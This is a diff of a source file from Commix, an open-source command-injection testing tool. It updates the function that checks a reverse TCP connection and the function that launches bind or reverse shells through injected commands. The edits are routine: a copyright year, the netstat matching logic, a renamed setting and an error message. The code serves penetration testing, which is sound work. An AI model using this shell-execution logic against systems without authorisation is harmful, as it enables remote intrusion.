@@ -3,7 +3,7 @@
 
 """
 This file is part of Commix Project (https://commixproject.com).
-Copyright (c) 2014-2020 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2021 Anastasios Stasinopoulos (@ancst).
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -34,20 +34,18 @@ Check for established connection
 """
 def check_established_connection():
   while True:
+    time.sleep(1)
     if settings.VERBOSITY_LEVEL == 1:
-      print("")
+      print(settings.SINGLE_WHITESPACE)
     warn_msg = "Something went wrong with the reverse TCP connection."
     warn_msg += " Please wait while checking state."
     print(settings.print_warning_msg(warn_msg))
-    time.sleep(10)
     lines = os.popen('netstat -anta').read().split("\n")
-    found = False
     for line in lines:
-      if "ESTABLISHED" in line and settings.LPORT in line.split():
-        found = True
+      if settings.LHOST + ":" + settings.LPORT in line and "ESTABLISHED" in line:
         pass
-    if not found:
-      return 
+      else:
+        return 
 
 """
 Execute the bind / reverse TCP shell
@@ -67,7 +65,7 @@ def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_
     if settings.FILE_BASED_STATE == True:
       response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     else:
-      whitespace = settings.WHITESPACE[0]
+      whitespace = settings.WHITESPACES[0]
       if whitespace == " ":
         whitespace = _urllib.parse.quote(whitespace) 
       response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -80,10 +78,10 @@ def execute_shell(separator, TAG, cmd, prefix, suffix, whitespace, http_request_
     check_established_connection()
   else:
     if settings.VERBOSITY_LEVEL == 1:
-      print("")
+      print(settings.SINGLE_WHITESPACE)
 
   err_msg = "The " + os_shell_option.split("_")[0] + " "
-  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed!"
+  err_msg += os_shell_option.split("_")[1].upper() + " connection has failed."
   print(settings.print_critical_msg(err_msg))
 
 """
